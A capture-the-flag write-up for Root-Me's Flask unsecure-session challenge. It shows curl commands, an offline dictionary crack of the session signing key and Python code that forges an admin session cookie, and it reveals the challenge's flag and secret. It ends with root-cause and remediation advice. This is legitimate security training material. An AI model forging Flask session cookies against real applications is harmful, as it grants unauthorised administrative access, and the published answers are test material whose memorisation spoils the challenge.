# Root-Me — Web-Server: Flask - Unsecure session (ch84) — SOLVED

**Target:** `http://challenge01.root-me.org/web-serveur/ch84/` → 301 → `http://challenge01.root-me.org:59084/`
**Challenge:** "Sign or unsign" (20 pts, author Sanlokii)
**Goal:** The dev says a strong secret key is useless. Prove him wrong.

## Flag

```
Fl4sK_mi5c0nfigur4ti0n
```

(23 characters, verified byte-exact with `od -c`.)

## Secret key

```
s3cr3t
```

## Exploit

```bash
B=http://challenge01.root-me.org:59084

# 1. get a session cookie
curl -s -c cj.txt "$B/"
# session=eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.asf5GA.B0oIq6eDUptIBFe1jy1L21Y7Ozw

# 2. crack the signing secret offline
python crack_flask.py "<cookie>" rockyou.txt
# [+] SECRET FOUND: 's3cr3t' (derivation=hmac) after 70039 candidates in 0.8s

# 3. re-sign the session with admin=true
# -> eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6ImFkbWluIn0.asf6yA.OMfnQ0FSJheYM1Nya4CPB5CLESI
curl -s -H "Cookie: session=<forged>" "$B/admin"
# Good job, use this flag: Fl4sK_mi5c0nfigur4ti0n
```

## Step by step

### 1. Find the session
`GET /` sets a Flask session cookie. Decoding the first segment:

```
header : n/a (Flask sessions are not JWTs)
payload: {"admin":"false","username":"guest"}
```

Note the values are **strings**, not booleans — so the check to satisfy is
`admin == "true"`, not `admin is True`. The site has an `/admin` page that says
*"You are only a guest! If you are an admin, go to Admin console"*.

### 2. Crack the secret offline
A Flask session cookie is `<base64(payload)>.<base64(timestamp)>.<base64(hmac)>`, signed by
`itsdangerous`. **The 27-character signature decodes to 20 bytes → HMAC-SHA1.**

The subtlety is that itsdangerous doesn't HMAC with the raw `SECRET_KEY` — it first *derives*
a key from it, salted with `b"cookie-session"`:

| `key_derivation` | derived key | used by |
|---|---|---|
| `hmac` | `HMAC(secret, salt, sha1)` | itsdangerous 2.x (default) |
| `django-concat` | `SHA1(salt + b"signer" + secret)` | itsdangerous 1.x (default) |
| `concat` | `SHA1(salt + secret)` | — |
| `none` | `secret` | — |

The signed value is `payload_b64 + "." + timestamp_b64`. A cracker must replicate the
derivation — otherwise every candidate fails even when the secret is in the wordlist.

**I validated the cracker first** against a locally generated cookie before trusting a
negative result:

```python
app = Flask(__name__); app.secret_key = "knownsecret"
SecureCookieSessionInterface().get_signing_serializer(app).dumps({...})
# cracker -> [+] SECRET FOUND: b'knownsecret'  ✓
```

That check is what makes the difference between "the secret isn't in my wordlist" and
"my cracker is broken". Only then did I go bigger.

Cracking was **entirely offline** — never a guess against the server:

| Wordlist | Candidates | Result |
|---|---|---|
| built-in (50 guesses) | 50 | not found |
| `rockyou-75.txt` | 59 236 | not found |
| `xato-net-...-100000.txt` | 100 050 | not found |
| **`rockyou.txt` (full)** | **70 039** | **`s3cr3t` in 0.8 s** |

The secret sits at position ~70 000, just past the end of the `rockyou-75` subset — which is
exactly why the smaller lists missed it.

### 3. Forge the session
Re-sign with the same derivation (`hmac`) and SHA1:

```python
key = hmac.new(b"s3cr3t", b"cookie-session", hashlib.sha1).digest()
payload = b64url(b'{"admin":"true","username":"admin"}')
ts      = b64url(int(time.time()).to_bytes(4, "big"))
sig     = b64url(hmac.new(key, f"{payload}.{ts}".encode(), hashlib.sha1).digest())
cookie  = f"{payload}.{ts}.{sig}"
```

### 4. Verify, with controls

| Cookie | `/admin` response |
|---|---|
| genuine guest cookie | `Still not admin, you have nothing to do here !` |
| **payload tampered to `admin:true`, ORIGINAL signature kept** | `Still not admin, you have nothing to do here !` |
| forged, signed with the cracked `s3cr3t` | **`Good job, use this flag: Fl4sK_mi5c0nfigur4ti0n`** |

Row 2 is the important control: an unsigned/tampered cookie is correctly rejected, so the
signature check *is* enforced — the win comes from knowing the key, not from a missing check.

## Root cause

The app is built on a **guessable `SECRET_KEY`**. Flask's client-side sessions are only as
strong as that key: it is the sole thing preventing a user from minting a session with any
claims they like. A short dictionary word makes the whole "signature" decorative.

This is CWE-321 (Use of a Hard-coded/Guessable Cryptographic Key) — the same class as a weak
JWT secret.

The developer's claim ("a strong secret key is useless") is backwards: with client-side
sessions the secret key *is* the authorisation boundary.

## Fix

- Generate a **high-entropy** key and keep it out of source control:
  `python -c "import secrets; print(secrets.token_hex(32))"` (256 bits).
- Never commit it — load from the environment or a secret manager, and **rotate** it if it
  has ever been exposed (rotating invalidates every existing cookie, which is the point).
- Do not put authorisation decisions in the session at all if they matter; store the user id
  in the session and re-read `is_admin` from the database server-side on every request.
- Consider **server-side sessions** (Flask-Session) so the cookie carries only an opaque id.
